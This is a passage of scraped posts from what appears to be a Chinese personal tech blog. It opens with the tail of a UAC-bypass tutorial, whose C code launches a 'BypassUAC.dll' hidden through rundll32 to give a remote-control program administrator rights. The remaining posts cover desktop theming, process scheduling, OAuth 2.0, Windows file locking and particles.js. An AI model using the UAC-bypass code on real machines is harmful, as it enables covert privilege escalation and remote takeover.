//获取当前程序所在目录 (strrchr(pszFileName, \u0026#39;\\\\\u0026#39;))[0] = 0; //拼接要注入dll路径 char pszDllName[MAX_PATH] = { 0 }; sprintf_s(pszDllName, \u0026#34;%s\\\\%s\u0026#34;, pszFileName, \u0026#34;BypassUAC.dll\u0026#34;); sprintf_s(szCmdLine, \u0026#34;%s %s %s\u0026#34;, szRundll32Path, pszDllName, \u0026#34;BypassUAC\u0026#34;); WinExec(szCmdLine, SW_HIDE); } 运行此Launcher，将以管理员权限打开我们的远控程序。\n管理员权限执行用户添加 而没有提权时我们的程序无法执行这个指令。\n正常权限下被拒绝访问 参考文章 [1] 酷扯儿.Windows编程技术：提权技术(下)[EB/OL].2020-09-22\nhttps://baijiahao.baidu.com/s?id=1678518589760092233\u0026wfr=spider\u0026for=pc\n[2] FDCFDMin.COM（Componet Object Model_组件对象模型）技术概述[EB/OL].2018-09-17\nhttps://blog.csdn.net/weixin_39743893/article/details/82500563\n[3] Microsoft.COM Technical Overview[EB/OL].2018-05-31\nhttps://docs.microsoft.com/zh-cn/windows/win32/com/com-technical-overview\n[4] 自己的小白.基于COM组件接口ICMLuaUtil的Bypass UAC[EB/OL].2020-04-24\nhttps://www.cnblogs.com/ndyxb/p/12770289.html\n本文中使用的远控程序 https://github.com/SGS4ever/RemoteCtrl\n","date":"2020-12-28T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%8F%90%E6%9D%83%E6%8A%80%E6%9C%AF--%E7%BB%95%E8%BF%87uac/","title":"提权技术--绕过UAC"},{"content":"谁能想到我在考试前一天还在写桌面美化的博客呢？\n电脑桌面是每天开机后进入工作之前第一眼看到的东西，一个美观的桌面能从心情上给人以振奋。我在整机重装之后学习了一下如何美化桌面，现在我的Window10系统桌面长成这样：\n桌面效果 1. rainmeter rainmeter实际上是一个系统状态监视软件，由于其强大的可定制性及扩展性，诸多使用者在原来的基础上开发了成百上千的插件程序和皮肤样式，使得现在的rainmeter几乎成为一款完美的系统美化工具。你可以从官网上下载它：\nRainmeter, desktop customization tool\n下载安装完成之后，打开这个程序，自带一个简单的样式，使得你可以在桌面上看到CPU使用率、磁盘使用情况等等。\n要达到美化的效果，仅仅使用自带的组件样式是不够的。我们需要从网络上寻找好看的rainmeter皮肤资源，这里首先给出官方的社区，本次桌面的效果就是使用社区中michaelpuerses大佬做的Sonder皮肤：\nSonder - Rainmeter skin by michaelpurses on DeviantArt\n需要注意的是，访问此网站需要科学上网，且最好选择漂亮国的节点，并开启全局模式。如果你不会，我也不打算教你，你可以从很多其他地方找到皮肤资源（如GitHub、国内各论坛等等）。此外，下载皮肤时要求进行注册，亲测gamil有效。\nrainmeter的皮肤有两种形式：\n.rmskin文件格式。这类文件直接双击打开，自动安装皮肤。 文件夹格式。这类皮肤需要手动放入你的rainmeter皮肤路径下，具体做法为：右键右下角的rainmeter小图标 \u0026ndash;\u0026gt; 皮肤 \u0026ndash;\u0026gt; 打开皮肤目录，将你下好（并解压）的文件夹放进去。 我在寻找皮肤的过程中，发现国内网站的相关内容真是少的可怜，找到一个论坛，下载皮肤的时候居然还要交钱买邀请码进行登录，属实有点离谱；百度rainmeter贴吧上面有些大佬的作品看着还可以，我没有试用过。\n你还可以从知乎或者一些外文评测贴中找到很多好看的主题推荐，这里给出两个外文帖子，我的主题就是在第二篇文章的推荐下找到的：\n43 Best Rainmeter Skins For Windows in 2020\n35 Spectacular Rainmeter Skins For Windows\n放张效果图吧，除了我现在使用的桌面外，rainmeter还能这样玩：\nEnigma主题效果图 看完是不是很想开启自己的皮肤邂逅之旅了？\n2. TaskbarX 实际上，我的桌面还有处地方值得注意：任务栏图标居中。看似细小处，实则是整个和谐的视觉体系中不可或缺的一部分。在很多Windows的美化教程中，都使用各式各样的软件来制作出类似MacOS的dock效果，而且实际上rainmeter也能制作dock效果，不过michaelpuerses大佬没有在我这款皮肤中实现dock。\n就我个人而言，完全仿照MacOS进行美化实在是有点过头了。很多好看的主题，只需要将任务栏透明化、图标居中之后就会产生画龙点睛的效果。\n于是引出我们要下载的第二款软件：TaskbarX。这款软件能使你的任务栏图标始终保持居中状态，其原理大概是每隔固定的时间进行检查与调整（我猜的）。链接如下：\nTaskbarX | Center taskbar icons (chrisandriessen.nl)\n我下载的是Zip包，因为微软商店的UWP版本要交钱，我没有钱。\n安装完成之后，你可以在安装路径中找到TaskbarX.exe和TaskbarX Configurator.exe，运行前者，实现对任务栏进行修改；运行后者，对任务栏样式进行设置。\n运行后者弹出一个设置界面，Style一栏控制任务栏背景样式，在我们的主题中，将其设置为透明且有些许模糊的效果：\n任务栏style 第二栏的Animation设置任务栏图标数量发生变化之后的动画效果，随自己喜好去设置即可。\n3. 一些细节 如果你要使用我的主题，你可能还需要注意到一个方面：我的桌面是没有图标的。\n桌面效果 这种蛋疼的做法实际上使得你的桌面除了美观，没有其他的优点，毕竟你无法使用快捷方式了。\n但是我已经习惯从资源管理器里面找程序或文件了，所以可以接受这种布局；实在特别常用的程序，固定到任务栏即可。\n实际上，有些rainmeter主题能够在桌面上制造一个抽屉类的组件，可以将快捷方式放在里面，鼠标移上去的时候展开，鼠标移开的时候关闭，效果极好，配合此主题使用极佳，这也是本主题将来可以进行改善的一点。\n有些人的电脑桌面除了快捷键之外还有回收站、此电脑等图标，这些图标可以按照以下步骤关闭：\nWin + i打开设置面板 \u0026ndash;\u0026gt; 个性化 \u0026ndash;\u0026gt; 主题 \u0026ndash;\u0026gt; 桌面图标设置 \u0026ndash;\u0026gt; 将不用的图标消勾即可\n本文用到的主题（侵权请联系删除）\nSonder-By-michaelpuerses\nWallPaper-Image\n参考资料\n[1] rainmeter.知乎[EB/OL].rainmeter - 知乎 (zhihu.com)\n","date":"2020-12-21T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%96%B9%E6%A1%88-rainmeter/","title":"桌面美化方案-Rainmeter"},{"content":"上一次挖的OAuth2.0坑还没填好，又要开一个操作系统的坑了\u0026hellip;\n本篇介绍一些简单的进程调度算法，以及它们的代码实现。文章的具体组织为：一些关键概念的介绍 \u0026ndash;\u0026gt; 四种进程调度算法（SJF、FCFS、HRRF、HPF）。\n话不多说，Let\u0026rsquo;s go！\n一些概念 在对四种调度算法进行介绍之前，有一些概念希望读者能够理解：\n周转时间：进程完成时间 - 进程到达时间。也就是整个进程从开始到结束所花费的时间。 平均周转时间：这个数值一般用于衡量调度的效率。比如在一段时间内来了5个进程，那么在这段时间内这些进程的平均周转时间就是五个进程的周转时间之和 / 5。 带权周转时间：某个进程的带权周转时间就是这个进程的周转时间 / 运行时间。由于系统中总有多个进程在运行，周转时间往往大于运行时间。因此，带权周转时间一般大于等于1。 平均带权周转时间：多个进程带权周转时间的平均值。 实际上，还有很多指标可以来衡量调度算法的优劣，如CPU利用率、系统吞吐量、响应时间等等。但是本文中介绍的调度算法与时间紧密相连，故此只需要理解以上几个概念，就能够看懂下文对于调度算法的分析。\n先来先服务算法（First Come First Serve，FCFS） 先来先服务算法简直是不怎么需要介绍的了。顾名思义，该算法使得CPU优先服务最先到达的进程。生活中充满着先来先服务算法：超市排队、食堂取餐等等。下面用一个例子来模拟这个算法：\n假设有五个进程，它们的到达时间和希望的运行时间如下：\n进程描述 本着先来先服务的原则，我们在第0秒的时间为进程1服务；在第4秒的时间服务结束，此时进程2、3、5都已到达，但是进程5是最先到的，因而进程5优先受到服务；在第6秒的时间进程5服务结束，此时在等候的进程还有进程2和进程3，为进程3服务，在第16秒的时间服务结束，此时还有进程2和进程4（在第7秒的时候到的），为进程2服务，在第22秒的时候结束进程2，服务进程4，最终在第34秒结束进程4。\nCPU对这五个进程的服务次序如下图所示：\n服务次序 如果你还记得第一小节所讲的内容，我们不妨算一下在这个例子中这几个概念分别是多少：\n统计时间 你看出其中存在的问题了吗？\n短作业优先算法（Shortest Job First，SJF） 先来先服务算法很好理解、在生活中很常见，但是它存在一个问题：对于一些运行时间很短的进程，光是在那边排队等待所花费的时间可能数倍于真正的运行时间！\n在上一个例子中，进程2所花费的运行时间只有6秒，但是它很不幸地被进程3抢占先机，只能眼睁睁看着进程3运行了10秒。光是等待的时间就比运行的时间还多！因此，它的带权周转时间也是最大的，现在是否对这个概念的理解深刻了许多？\n先来先服务的死板特性对于某些短作业来说简直是灾难，此时，短作业优先算法就显得友好许多。\n短作业优先算法不关注进程的到达时间，当CPU结束了一个进程的服务之后，永远从等待的所有进程中找出运行时间最短的进程为其服务。\n还是上面的例子，在第0秒的时间为进程1服务，在第4秒的时间进程2、3、5都已到达，此时进程5需要的时间最少，因此它优先受到服务；在第6秒的时间进程5的服务结束了，此时在等候的进程还有2和3，虽然进程3是先到的，但是进程2所需要的时间更少，因此进程2优先受到服务；在第12秒的时候进程2的服务结束了，此时在等候的进程还有3和4，优先为进程3服务，在第22秒的时候为进程4服务，在第34秒的时候结束。\n这个例子中，我们的进程2比进程3更晚到达，但是由于它所需要的时间更短，就得到了优先的服务。这就是短作业优先的思想。\n如果你没有第一时间看出这个算法的问题，那么请考虑下面这个例子：\n新例子 在这里，我们只是把进程4的运行时间由12秒调整为8秒，其他的没有变化。\n但是此时，我们在第12秒的时候结束了进程2的服务，此时在等候的还有进程3和进程4，我们优先服务进程4，在第20秒的时候结束它，服务进程3，在第30秒的时候进程3结束。\n把数据完善一下，就会发现问题所在：\n新数据 可怜的进程3，在第2秒到达，在第30秒结束，周转时间高达28秒！\n这就是短作业优先的问题——当系统中不断地有短作业到来的时候，很早就在那里等待的长作业就无法得到服务，最终出现进程饥饿。\n最高响应比优先算法（Highest Response Ratio First，HRRF） 在短作业优先算法中，进程饥饿是一个比较致命的问题。但是短作业优先的思想确实是有相当的可取之处的，于是人们考虑保留这种思想，同时使得长进程能够较少地受到饥饿，这就有了最高响应比优先算法。\n首先，什么是响应比：一个进程的响应比由以下这个公式得到——\nRR = (BT + WT) / BT = 1 + WT / BT\n其中，BT（Burst Time）表示运行时间，WT （Wait Time）表示等待时间。对于一个进程来说，（运行时间+等待时间）除以（运行时间）就是它的响应比。\n不难看出，一个进程的运行时间是不变的，而等待时间每时每刻都在变化，因此一个进程的响应比是每时每刻都在变化的。\n对于RR = 1 + WT / BT，显然每个进程的初始响应比都是1，因为刚刚到达的时候没有等待时间；随着等待时间的变长，进程的响应比不断地变大，它受到调度进入CPU的概率也就变大了。\nHRRF算法还有一个优点：它保留了短作业优先的原则。也就是说，对于同时到达的任务，虽然大家的响应比都是1，但是短作业优先，而长作业需要随着等待时间的增加慢慢地提高自己的响应比，最终接受调度。\n还是考虑第三小节的例子：\n新例子 在第0秒的时间，进程1到达，在第4秒的时间结束服务，此时进程2/3/5已经到达，计算它们的响应比：\n第四秒响应比 可见，此时进程5已经等待很久了，需要让它接受服务。\n进程5运行2秒，在第6秒的时间结束，此时还有进程2/3在等待，计算它们的响应比：\n第六秒响应比 可见，进程2的响应比还是高一些，让它接受服务。\n在第12秒的时候进程2结束，此时进程3和进程4在等待，计算它们的响应比：\n第十二秒响应比 此时让进程3接受服务，在第22秒的时候结束，进程4进入，在第30秒的时候结束。\n老规矩，计算数值：\n新数据 相比于SJF算法，这个算法使得长进程3免于饥饿，是一个比较暖心的做法。\n这个算法唯一的问题，就是我们需要每时每刻地计算各个进程的响应比，同时需要把它们的响应比存入内存的某个空间中；增加了计算，增加了开销。\n最高优先数优先（Highest Priority First，HPF） 最高优先数优先算法不关注进程的各种时间，而根据进程的**优先数（又称优先级）**进行调度。这个算法要求每个进程都要具备一个优先级，这个优先级可以是静态的，也可以是动态的。静态优先级在进程创建的时候分配，在进程生存周期内保持不变；动态优先级允许在进程生存期内被修改。\n实际上，之前的几种算法可以看做是这个算法的特例：比如短作业优先算法，进程的优先级可以看成是与运行时间成反比的一个数，即进程运行时间越短，优先级越高，因而越短的进程越先得到调度。\n在这个算法中，我们要引入两个概念：剥夺和非剥夺（又称抢占和非抢占）。\n*剥夺（抢占）*指的是在一个进程到达的时候，若当前运行的进程优先级小于自己，则它可以抢占当前进程的CPU，而被抢占的进程就会进入就绪队列，等待下一轮调度。\n*非剥夺（非抢占）*的调度方式就是指无论到达的进程优先级多高，都要等待当前进程运行完成（或者分配给它的时间用完），才能进入调度。\n以看病为例，抢占的看病方式就是你正在被医生诊断，此时突然来了急诊，医生就把你扔下，先去抢救伤员了；而非抢占的方式就是医生一定要把你诊断完成，再去抢救伤员。\n例子听起来比较离谱。这两种方式实际上各有优点，读者可以自行体会。\n回到正题，我们先考虑抢占方式下的HPF算法，首先为上面的例子中的几个进程引入优先级：\n新例子 在第0秒的时候，进程1到达，开始为其服务；\n在第1秒的时候，进程5到达，由于进程5的优先级高于进程1，此时将暂停进程1的服务，转为服务进程5，记住此时进程1还需要运行3秒的时间；\n在第2秒的时候，进程3到达，由于进程3的优先级低于进程5，CPU继续服务进程5；\n在第3秒的时候，进程5运行结束，此时进程2到达，现在等待的进程有1/2/3，由于进程2的优先级最高，系统为其服务；\n在第7秒的时候进程4到达，不会打断进程2；\n在第9秒的时候，进程2结束，此时等待的进程有1/3/4，由于进程3的优先级最高，系统为其服务；\n在第19秒的时候，进程3结束，此时等待的进程有1/4，由于进程4的优先级更高，系统为其服务；\n在第27秒的时候，进程4结束，此时为进程1服务，完成剩下的3秒时间，在第30秒结束。\n抢占式HPF 在这个例子中，进程1最先到达，最晚结束，简直惨兮兮；但是我们首次看到了两个带权周转时间为1的情况，表明这个调度方式在优先级设置合理的条件下，效率还是不错的。\n对于非抢占式调度，上面三个小节已经讲了太多，在此不加赘述。\n小结 本文介绍了四种调度算法，并以几个简单的例子具体模拟了它们的运行模式。本来还希望附上这几个算法的代码实现，但篇幅有限，只好新开一篇。\n如果你认为我有哪些地方没有讲清楚，或者有哪些错误之处，欢迎评论区留言告诉我。(ノ￣▽￣)\n","date":"2020-10-19T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E8%BF%9B%E7%A8%8B%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95/","title":"一些简单的进程调度算法"},{"content":"本文将介绍开放授权协议的概念，OAuth协议解决的问题以及OAuth协议的设计方案与应用情况。\n1. 背景 在生活中，我们接触的各种网络服务通常需要使用我们的个人资源。例如，我们使用网易云音乐，但是选择QQ登录，这时网易云需要获取我们的QQ账号信息，如果双方之间没有一个有效的授权机制，就会对我们的隐私安全造成威胁。试想：网易云音乐如何获取我们的QQ账号信息呢？无非是让我们给出我们的账号密码吧。但是这样做有如下严重的缺点：\n我们需要把QQ账号密码告诉网易云音乐，增加了泄露的风险； 网易云音乐拥有了对你的QQ账号的操作权限——想想都头皮发麻； 需要收回网易云音乐对QQ的访问权限时，只能通过修改密码的方式，但是这样做会使其他使用同样方式访问QQ的应用全部失效。 基于此，开放授权（Open Authorization）希望能够使得第三方无需知道用户的账号及密码，就可以获取用户的授权信息。\n如果是你，你会怎么实现它？\n2. 设计方案 OAuth2.0主要涉及四种角色，分别是：\n用户，即资源所有者。 资源服务器，即服务提供商。用来存放受保护的用户资源。在上面的例子中，资源服务器就是QQ服务器。 客户端，向资源服务器进行资源请求的第三方应用程序。在上面的例子中，客户端就是网易云音乐服务器。 认证服务器，在验证资源所有者并取得所有者的授权后，将访问令牌发给客户端。当我们想使用QQ登录网易云音乐，首先就是要证明我们的号主身份，这就是认证服务器的工作——证明身份、取得授权、允许第三方访问。 显然，资源服务和认证服务的提供者都是QQ，因此它们可以运行在同一台服务器上。\nOAuth2.0 就是在这四个角色的基础上，设计了四种授权模式：授权码（Authorization Code）模式、简化模式、密码模式和客户端模式。下面就重点一起看一下授权码模式的工作流程。\n3. 授权码模式 授权码是认证服务器提供的一串序列，客户端可以凭借授权码向认证服务器索要访问令牌（Access Token），进而实现相应资源的访问。没看懂？举个例子——\n还是使用QQ授权登录网易云音乐，我们需要经历如下的流程：\n打开网易云音乐，点击“使用QQ登录”； 网易云音乐跟我们说：想使用QQ登录？行，但是我现在没有访问QQ账号的权限，给你张纸条，上面写了我要访问你账号哪些信息，你去找QQ让他同意我访问； 于是我们来到QQ认证界面。QQ首先要我们登录账号，然后跟我们说：网易云音乐想要你的昵称信息、头像信息等等等等，你同意不？ 我们选择同意。于是QQ给了我们一张纸条，跟我们说：这个纸条上写了访问你昵称头像信息的授权码，你拿去给网易云音乐，他拿着这个条子来找我，我就让他访问； 于是我们把写着授权码的条子给了网易云音乐，他拿着这个条子去找QQ了，QQ的认证服务器根据这张条子给网易云音乐开出了一个访问令牌（Access Token），网易云拿到了这张令牌，并凭借它成功访问了我们的QQ账号信息。 网易云音乐拿到这个账号信息，在自己数据库里面一查，发现这个QQ账号已经跟某个网易云音乐账号绑定了，于是我们成功使用自己的QQ账号登录了网易云音乐。 这就是非常具象的授权码模式，是不是非常简单？\n但是，这里还有一些细节需要思考：\nQQ会说，我这么没牌面的吗？谁想从我这请求资源我就给他？ 在上面的例子中，我们从网易云音乐去找QQ，拿到授权码之后回去找网易云音乐。但是，在真实的浏览器和Web服务器交互的过程中，我们的浏览器可没这么聪明，我们要给它规划好路线才行。 针对第一个问题，OAuth2.0给足了资源服务器面子，它要求：所有的客户端都要在资源服务器那边进行事先的注册，否则直接不给予访问的权限。也就是说，网易云音乐事先已经跟QQ说好了，每次要访问QQ账号信息的时候都会带上身份证明，以表明这是网易云音乐要来访问QQ的资源了。客户端在资源提供方注册的时候，会拿到资源提供方给出的一个client_id和client_secret，之后就用这两个东西表明身份。\n而针对第二个问题，我们在向QQ请求授权码的时候，需要提供redirect_uri（或callback_uri）字段，表明浏览器拿到授权码之后要交给谁。于是，授权码模式的完整交互流程如下：\n授权码工作模式 4. 简化模式 看完授权码模式，如果你觉得这个流程有点繁琐，那么简化模式可能会让你快乐一些：\n简化模式 在这个模式中，少掉了授权码的传递，直接传递访问令牌，所有步骤在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。\n这样的模式对一些纯前端的网络服务比较友好，因为它不需要资源请求者与资源提供者进行认证交互，直接拿着访问令牌找上门就好了。\n但是它叫简化模式，就是因为它存在安全问题。试想：重要的访问令牌就这样在浏览器和资源提供方之间传递，假设攻击者截获了访问令牌，就能够获取到你的资源。\n5. 密码模式 在密码模式中，用户向客户端提供自己的用户名和密码。客户端使用这些信息向资源服务器索要授权。这就是我们开头讲过的模式，它要求用户提供自己的用户名和密码，但是客户端不得存储这些信息。显然该模式建立在用户对客户端的高度信任上，通常这里的客户端属于操作系统的一部分，或者由著名的公司出品。而认证服务器只有在其他授权模式无法执行的情况下，才考虑使用这种模式。\n6. 客户端模式 客户端以自己的名义，而不是用户的名义，向服务提供商进行认证。严格地说，这种模式并不属于OAuth框架所要解决的问题。在这种模式中，用户直接向客户端注册，客户端以自己的名义要求服务提供商提供服务，其实不存在授权问题。\n小结 OAuth2.0 协议率先被谷歌、雅虎、微软、FaceBook等公司使用，且目前得到较广泛的普及。之所以标注为2.0，是因为最初有一个1.0协议，但是这个1.0协议太复杂，易用性差，所以没有得到普及。2.0是一个新的设计，但它并不兼容1.0，可以说与1.0没什么关系。\n本文简要介绍了OAuth2.0的四种工作方式，通过网易云音乐和QQ的认证交互，希望能使读者对此有初步的认识。关于具体的交互URL，本文没有给出，可以参考文末的一些博客。关于针对OAuth2.0的一些攻击手段，请见下回分解。\n参考资料： [1] 石瑞生，吴旭. 大数据安全与隐私保护[M]. 北京：北京邮电大学出版社，2019\n[2] 十八岁的夏天. OAuth2.0的简介. [EB/OL]. [2019-08-19]. https://www.cnblogs.com/xiaofengwang/p/11376881.html\n[3] 阮一峰. 理解OAuth2.0. [EB/OL]. [2014-05-12]. http://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html\n","date":"2020-10-12T00:00:00Z","permalink":"https://xrg.fj.cn/p/oauth2.0%E6%B5%85%E6%9E%90/","title":"OAuth2.0浅析"},{"content":"这段期间没学到任何完整的、值得记录的东西，因此好久没有更新博客了，凑巧中午一边喝大红袍一边搞出了一点东西，虽然不太完整，也不妨一记。\n最近在捣鼓Windows下应用程序调用API的情况统计，思路是向指定的进程中注入DLL，钩取系统API，这样每次进程调用API的时候先执行我们的语句，向统计文件中写入一条调用信息。\n由此，引出了一个问题：如果我们注入了多个进程，这些进程同时调用一个API的时候，都要往统计文件中写一条信息，如何保持它们的同步呢？\n答案就是文件锁。\n锁 互斥锁是操作系统用来保持进程间同步的一个关键工具，多个进程同时对一个对象执行操作的时候，要分清楚先后顺序，否则可能产生混乱。比如，一个进程1要向一个文件里面写入1 ~ 100的数，而进程2要向这个文件里面写入101 ~ 200的数，我们希望进程1写完之后再让进程2写，但是系统在执行进程调度的时候，是可能在进程1写到一半的时候将其挂起，转而去执行其他进程的。想一想有没有可能出现这种情况：进程1写到了50，系统将其挂起，去执行其他进程，其他进程执行完之后，系统不执行进程1，而是执行进程2，于是我们的文件中的数字就变成了1,2\u0026hellip;50,101,102\u0026hellip;\n显然，这样的情况是可能出现但是绝对不符合需求的，我们要想办法避免它。\n于是操作系统为我们提供了互斥锁，即一个进程对某个对象执行操作的时候，将这个对象锁定，这时其他的进程就无法对这个对象执行操作了。\n本篇中的文件锁其实就是作用在文件上的互斥锁。还是刚才的例子，如果进程1在一开始就为文件上了锁，当它执行到一半被挂起的时候，即使系统转为执行进程2，此时进程2也会因为无法获得文件锁而被阻塞；仅当进程1完成了写入，释放了文件锁，进程2才会被唤醒执行。\n这样的工作模式可不止用来保持文件的读写同步，还可以解决一系列的同步问题。锁的思想在操作系统领域是非常重要的，这里的介绍不够全面，主要也是由于笔者目前的水平不够，有兴趣的朋友可以自行深入了解。\n创建文件 初步了解了文件锁的含义之后，就要进入编码实践了。本篇后续编码是以C++为主体，但是核心部分完全兼容C语言。\n首先要明确一点，C++的文件流操作无法实现文件锁。这个是笔者目前的水平下得出的结论，欢迎见多识广的读者在评论区批评指正。\n既然无法使用fstream实现文件锁，就必须老老实实使用C语言的文件操作了。\n在这里，由于WindowsAPI提供的文件锁函数需要一个HANDLE类型作为参数，我们只能使用CreateFile函数去创建文件了。\n该API详见此文档。\n我们使用以下两句话创建了一个文件，这里文件路径可以自由定义。\nconst char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA( logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0 ); 值得注意的是CreateFileA的参数OPEN_ALWAYS，该参数指定了文件的打开方式：当文件不存在时，创建它；当文件存在时，打开它。\n文件上锁 文件创建完成之后，正常的下一步操作应该是写入了。但是谨记，为了不发生开头提到的进程同步问题，我们要在写入文件之前先拿到文件的锁。这里使用Windows提供的一个关键函数LockFileEx()。\n该API详见此文档\n我们使用以下几句话为文件上了个锁，这里的overlapped变量是API要求我们传入的，没有很大的用处，将其置零即可。\nOVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000;\t// 上锁的字节数，没有很大的意义，非零即可。 if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } 当文件上锁失败，if判断会成立，进入错误处理环节。记住开头提到的锁的机制，当一个进程无法获取当前的文件锁的时候，它应该是会被阻塞而非直接报错。在我的试验中，进入这个分支的情况是第一步CreateFile的时候得到了一个无效的句柄，而非无法获取当前文件的锁。\nLickFileEx()函数的第二个参数比较关键，当它被指定为LOCKFILE_FAIL_IMMEDIATELY 的时候会直接返回失败，而不是阻塞当前进程。在这里，我们当然不选这个参数。\n文件上锁成功之后，就可以进行文件的写入了。\nelse { std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 1 locked the file. [+]\\n\u0026#34;; // 将文件指针移动到文件末尾，实现以追加方式写入 SetFilePointer(hFile, 0, NULL, FILE_END); ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); getchar();\t// 在此处停止，先不释放文件锁 UnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } 将以上的三个部分结合起来，就是第一个进程的代码：\nint main() { const char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA(logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0); OVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000; if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } else { std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 1 locked the file. [+]\\n\u0026#34;; // 将文件指针移动到文件末尾，实现以追加方式写入 SetFilePointer(hFile, 0, NULL, FILE_END); ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); getchar();\t// 在此处停止，先不释放文件锁 UnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } system(\u0026#34;pause\u0026#34;); return 0; } 第二个进程 第二个进程被我们用来验证这个锁的可行性，即当第一个进程为文件上了锁，且还没释放的时候，第二个进程究竟能否对文件进行写入。\nint main() { const char* logPath = \u0026#34;C:\\\\Users\\\\Administrator\\\\Desktop\\\\recLog.txt\u0026#34;; HANDLE hFile = ::CreateFileA(logPath, GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_ALWAYS, 0, 0); OVERLAPPED overlapped; memset(\u0026amp;overlapped, 0, sizeof(overlapped)); const int lockSize = 10000; if (!LockFileEx(hFile, LOCKFILE_EXCLUSIVE_LOCK, 0, lockSize, 0, \u0026amp;overlapped)) { DWORD err = GetLastError(); printf(\u0026#34;Error %i\\n\u0026#34;, err); } else { std::cout \u0026lt;\u0026lt; \u0026#34;Get lock.\\n\u0026#34;; std::string str(\u0026#34;\u0026#34;); str += \u0026#34;[+] Process 2 locked the file. [+]\\n\u0026#34;; SetFilePointer(hFile, 0, NULL, FILE_END);\t// 将文件指针移动到文件末尾，实现以追加方式写入 ::WriteFile(hFile, str.c_str(), str.length(), 0, 0); // getchar();\t// 在此处停止，先不释放文件锁 UnlockFileEx(hFile, 0, lockSize, 0, \u0026amp;overlapped); CloseHandle(hFile); std::cout \u0026lt;\u0026lt; \u0026#34;Unlock file.\\n\u0026#34;; } system(\u0026#34;pause\u0026#34;); return 0; } 验证 首先运行第一个进程，它将在getchar()函数部分停止，此时还没有释放文件锁； 转为运行第二个进程，此时它无法对文件进行上锁操作； 在第一个进程窗口按下任意键，它将释放文件锁，并关闭文件句柄； 观察第二个进程输出，发现它已经得到文件锁，并在文件中写入了对应信息。 先后打开两个进程 第一个进程释放锁 文件内容实现同步 ","date":"2020-09-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E8%BF%9B%E7%A8%8B%E9%97%B4%E6%96%87%E4%BB%B6%E5%90%8C%E6%AD%A5%E5%86%99/","title":"进程间文件同步写"},{"content":"初生的博客，更新就是频繁。\n如果你看到这篇博文，应该能注意到这篇博文的背景有了一点小变化。\n没错，在这篇文章里，我要记录一款强大的JS插件particles.js的使用方法，这款应用能让你的网页背景看起来不那么单调（简直非常适合我现在的博客主题）。\n你可以在下面这个链接找到这款应用的源码，虽然我成功使用这款插件的历程比较艰辛，但是我还是非常敬佩能写出这种代码的人。\n(https://github.com/VincentGarreau/particles.js)\n话不多说，let\u0026rsquo;s go!\n下载这款插件 你可以直接使用git clone或者从网页上下载它。\n解压完成之后，你可以看到一个Demo文件夹，不妨先进去看看正确使用这款应用的时候能产生什么效果。\n在源码中为插件留出位置 在插件作者的GitHub仓库里实际上已经写明了使用方法，但是我要结合hugo和我的主题——Keepit——再详细地介绍一次。\n在你的页面中为插件留出位置，这个操作非常简单。打开你的footer.html，找一个合适的位置（最好是最外层），加上一个标签：\n\u0026lt;div id=\u0026quot;particles-js\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\n然后，就没有然后了！现在你的插件已经能够找到它的容身之所了，准备让它运行起来吧！\np.s footer.html在文件夹partials里，看过第一篇博文的你，应该很熟悉它的内容了吧？关于我们为什么要在这个文件里加上这个东西，主要是考虑到任何界面都有这么一个版权说明模块，那么也就是任何界面到时候都会有漂漂亮亮的背景！还有，我认为可能存在某些主题没有footer.html文件，但是这根本没什么关系，你也可以把这个div加在任何你想要的的地方。\np.p.s 2021年1月14日，现在我把这部分代码加在了layouts/_default/baseof.html，因为它似乎是所有页面的基本框架，适用性更强一些。\n引入插件 